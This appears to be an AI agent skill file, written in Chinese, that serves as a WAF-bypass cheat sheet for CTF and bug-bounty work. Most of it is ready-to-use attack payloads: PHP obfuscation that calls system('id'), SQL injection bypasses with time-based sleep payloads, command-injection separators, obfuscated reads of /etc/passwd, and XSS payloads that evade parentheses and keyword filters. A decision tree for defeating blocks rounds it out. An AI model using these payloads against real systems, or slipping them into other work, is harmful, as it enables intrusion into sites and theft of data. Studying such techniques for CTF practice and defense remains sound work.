---
name: waf-bypass
description: WAF 绕过技巧库 — 各类WAF绕过方法
---

# WAF 绕过技巧库

## PHP WAF 绕过

### preg_replace 双写绕过（关键技巧）

`preg_replace()` 会**循环替换**直到没有匹配为止，但如果关键词被替换后**拼出了新的关键词**，只会替换内层，外层保留。

**核心原理**：`preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → 删除中间的 `NSSCTF` → 剩下 `NSS` + `CTF` = `NSSCTF`

**通用模板**：
```
假设过滤关键词为 X（如 NSSCTF）
构造输入: X拆成两半, 在中间嵌入完整X
即: X前半 + X + X后半

示例:
过滤 NSSCTF → 输入 NSS + NSSCTF + CTF = NSSNSSCTFCTF
过滤 flag   → 输入 fl + flag + ag = flflagag
过滤 cat    → 输入 ca + cat + t = cacatt
过滤 system → 输入 sys + system + tem = syssystemtem
```

**为什么简单的大小写绕过不适用于 preg_replace**：
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` 不匹配 `NSS`（无 i 修饰符）→ 原样输出 `NssCTF`
- `NssCTF !== "NSSCTF"`（严格比较失败）→ 不通过
- 只有双写绕过才能让替换后**恰好得到原始关键词字符串**

**⚠️ 识别场景**：
- 源码含 `preg_replace('/关键词/', '', $input)` 且需要 `$input` 替换后**等于关键词本身** → 立即用双写绕过
- 不要尝试大小写绕过（替换后不等于原关键词）或编码绕过（编码字符串不等于原关键词）

### 函数名混淆
- Base64 编码恢复：`$f=base64_decode('c3lzdGVt');$f('id');`
- 字符串拼接：`$f='sys'.'tem';$f('id');`
- 可变函数：`$a='sys';$b='tem';$a$b('id');`

### 关键字绕过
- 拆分路径：`'/va'.'r/ww'.'w/ht'.'ml'`
- 注释绕过：`sys/**/tem('id');`
- 反转字符串：`$f=strrev('metsys');$f('id');`

## SQL 注入绕过

### 关键字绕过
- 大小写混合：`SeLeCt` 代替 `SELECT`
- 内联注释：`S/*!ELECT*/`
- 双重编码：`%2565` → `%65` → `e`
- 等价函数：`GROUP_CONCAT` 替代 `concat_ws`

### 注释符变体
- `-- -` 代替 `--`
- `--+` 代替 `-- `
- `#` 代替 `--`

## 命令注入绕过

### 分隔符变体
- 换行符：`id\nwhoami`
- 管道符：`id|whoami`
- 逻辑运算：`id&&whoami`
- 子 shell：`$(id)` 或 `` `id` ``

### 命令混淆
- 变量拼接：`a=i;b=d;$a$b`
- 通配符：`/bin/ca? /etc/pas?d`
- 空变量：`c'a't /etc/passwd`
- 转义：`c\at /etc/passwd`

## XSS 绕过

### 标签变体
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`

### 事件处理器
- `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`

### 编码绕过
- HTML 实体编码
- Unicode 编码
- Base64 编码（配合 eval）

---

## 附：绕过决策方法论（src-hunter 通用绕过工具箱精华）

### 绕过的本质

```
绕过 = 解析差异 + 边界 corner case + 防护盲区
```

每次被拦时问自己三问：
- **Q1** 防护组件和后端的解析是否一致？（前置 WAF vs Tomcat、CDN vs 源站）
- **Q2** 防护是否覆盖所有 corner case？（双编码、混合大小写、长度溢出）
- **Q3** 防护是否覆盖所有入口？（Header、Cookie、HPP、其他 HTTP 动词）

### 决策树

```
Payload 被拦
 ├─ 看返回是 WAF？应用？还是源站？
 │   ├─ WAF 拦 → 协议层绕过（HPP / Chunked / 大小写 / Content-Type 切换）
 │   └─ 应用拦 → 编码层 / 语义层（双写、注释、等价函数）
 ├─ 看是黑名单还是白名单
 │   ├─ 黑名单 → 找漏掉的关键字 / 同义词
 │   └─ 白名单 → 找白名单允许的危险用法
 └─ 看是输入过滤还是输出编码
     ├─ 输入过滤 → 多重编码 / 二次注入
     └─ 输出编码 → 上下文逃逸（HTML→JS、URL→JS）
```

### SQLi 绕过速查（分维度）

| 维度 | 技巧 | Payload 示例 |
|------|------|-------------|
| 关键字过滤 | 双写 | `UNunionION SELselectECT`（一次替换型过滤器） |
| 关键字过滤 | MySQL 内联注释 | `/*!50000union*//*!50000select*/` |
| 关键字过滤 | 同义词 | `\|\|` 代 `OR`，`&&` 代 `AND` |
| 等号过滤 | 等价替换 | `LIKE` / `REGEXP` / `IN(1)` / `BETWEEN` 代 `=` |
| 空格过滤 | 空白符变体 | `/**/` `%09` `%0a` `%0d`；括号嵌套 `select(user)from(dual)` |
| 引号过滤 | 编码 | `0x61646D696E`（hex）、`char(97,100,109,105,110)`、`%df%27`（GBK 宽字节） |
| sleep 被过滤 | 双层延时 | `id=(select(2)from(select(sleep(8)))v)` |
| sleep 被过滤 | 条件延时 | `id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(10) ELSE 1 END))` |

### XSS 事件库（按罕见度，越往下越能打 WAF）

```
onerror onload onclick onmouseover                  # 已被多数 WAF 收录
onfocus onblur oninput onchange autofocus           # 中等
onanimationend ontransitionend ontoggle ontouchstart
onpointerenter oncanplay onauxclick onbeforeprint   # 罕见
```

### XSS 无括号/关键字绕过

```
alert`1`                       # 模板字符串绕括号
throw onerror=alert,1
eval('al'+'ert(1)')             # 拼接
Function('alert(1)')()         # 构造器
window['al'+'ert'](1)
String.fromCharCode(97,108,101,114,116,40,49,41)
location='javascript:alert(1)'
```
